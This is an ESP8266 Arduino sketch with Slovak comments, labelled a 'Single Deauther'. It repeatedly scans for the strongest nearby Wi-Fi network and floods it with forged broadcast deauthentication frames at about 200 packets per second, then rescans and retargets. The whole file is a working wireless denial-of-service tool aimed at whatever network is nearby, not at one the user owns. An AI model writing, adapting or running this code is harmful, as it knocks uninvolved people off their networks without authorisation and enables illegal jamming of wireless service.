#include <ESP8266WiFi.h>

extern "C" {
  #include "user_interface.h"
}

// —————— NASTAVENIA ——————
const int DEAUTH_DURATION_MS = 10000;  // Ako dlho deauthovať (10s)
const int SCAN_INTERVAL_MS = 2000;     // Koľko čakať po deauthu pred novým scanom
const int DEAUTH_RATE_HZ = 200;         // Paketov za sekundu (odporúčané: 100–300)

// —————— GLOBÁLNE ——————
struct ApInfo {
  String ssid;
  uint8_t bssid[6];
  int channel;
  int rssi;
};

ApInfo currentTarget;
bool hasTarget = false;
unsigned long lastDeauthEnd = 0;

// —————— POMOCNÉ ——————
String bssidToString(const uint8_t* bssid) {
  char buf[18];
  sprintf(buf, "%02X:%02X:%02X:%02X:%02X:%02X",
    bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5]);
  return String(buf);
}

bool sendDeauth(const uint8_t* bssid, const uint8_t* ap_mac, uint8_t channel) {
  uint8_t packet[26] = {
    0xC0, 0x00, 0x00, 0x00, // typ, duration
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // broadcast (addr1)
    ap_mac[0], ap_mac[1], ap_mac[2], ap_mac[3], ap_mac[4], ap_mac[5], // addr2
    bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5], // addr3 = BSSID
    0x00, 0x00
  };
  wifi_set_channel(channel);
  return wifi_send_pkt_freedom(packet, 26, 0) == 0;
}

ApInfo findStrongestAp() {
  Serial.println("[SCAN] Hľadám najsilnejšiu sieť...");
  int n = WiFi.scanNetworks(false, true); // async + passive
  delay(5000);
  n = WiFi.scanComplete();

  ApInfo best;
  int bestRssi = -1000;

  for (int i = 0; i < n; i++) {
    int rssi = WiFi.RSSI(i);
    if (rssi > bestRssi && WiFi.SSID(i).length() > 0) {
      bestRssi = rssi;
      best.ssid = WiFi.SSID(i);
      WiFi.BSSID(i, best.bssid);
      best.channel = WiFi.channel(i);
      best.rssi = rssi;
    }
  }

  if (bestRssi > -100) {
    Serial.printf("[SCAN] Najsilnejšia: %s (%s) ch=%d rssi=%d\n",
      best.ssid.c_str(), bssidToString(best.bssid).c_str(), best.channel, best.rssi);
    return best;
  } else {
    Serial.println("[SCAN] Žiadna sieť nenájdená.");
    return ApInfo();
  }
}

// —————— SETUP ——————
void setup() {
  Serial.begin(115200);
  delay(100);

  // Iba STA režim (stačí na scan a deauth)
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();

  Serial.println("\n=== ESP8266 Single Deauther ===");
  Serial.println("Čakám na prvé skenovanie...");
}

// —————— LOOP ——————
void loop() {
  unsigned long now = millis();

  // ———— 1. Ak už deauthoval, ale čas vypršal → pauza → nový scan
  if (hasTarget && (now - lastDeauthEnd) > SCAN_INTERVAL_MS) {
    Serial.println("[INFO] Pauza skončila — kontrolujem nové siete...");
    ApInfo newTarget = findStrongestAp();
    
    if (newTarget.ssid.length() == 0) {
      Serial.println("[INFO] Žiadna sieť — čakám 5s.");
      delay(5000);
      return;
    }

    // Porovnaj BSSID: ak sa zmenila → prepnúť
    bool sameBssid = (memcmp(newTarget.bssid, currentTarget.bssid, 6) == 0);
    if (!sameBssid || newTarget.rssi > currentTarget.rssi + 5) { // +5 dBm → nová lepšia
      Serial.println("[INFO] Zmena cieľa: nová sieť je silnejšia/odlišná.");
      currentTarget = newTarget;
      hasTarget = true;
    } else {
      Serial.println("[INFO] Cieľ sa nezmenil — pokračujem v deauthu.");
    }

    // Spustiť nový deauth cyklus
    lastDeauthEnd = 0; // reset — aby sa spustil deauth nižšie
  }

  // ———— 2. Ak nemáme cieľ, alebo čas na ďalší deauth
  if (!hasTarget || now >= lastDeauthEnd + SCAN_INTERVAL_MS) {
    if (!hasTarget) {
      currentTarget = findStrongestAp();
      if (currentTarget.ssid.length() == 0) {
        delay(5000);
        return;
      }
      hasTarget = true;
    }

    // ———— 3. Deauth fáza (DEAUTH_DURATION_MS)
    Serial.printf("[DEAUTH] Začínam deauth na %s (%s) na %d s\n",
      currentTarget.ssid.c_str(), bssidToString(currentTarget.bssid).c_str(),
      DEAUTH_DURATION_MS / 1000);

    unsigned long start = millis();
    int packetsSent = 0;
    unsigned long nextPacket = start;

    while (millis() - start < DEAUTH_DURATION_MS) {
      unsigned long now2 = millis();
      if (now2 >= nextPacket) {
        if (sendDeauth(currentTarget.bssid, currentTarget.bssid, currentTarget.channel)) {
          packetsSent++;
        } else {
          Serial.println("[!] Chyba pri odosielaní deauth paketu!");
        }
        nextPacket += 1000 / DEAUTH_RATE_HZ; // napr. 5ms → 200 Hz
      }
      delayMicroseconds(100); // neblokuj watchdog
    }

    Serial.printf("[DEAUTH] Hotovo. Poslaných %d paketov.\n", packetsSent);
    lastDeauthEnd = millis();
  }

  delay(1);
}
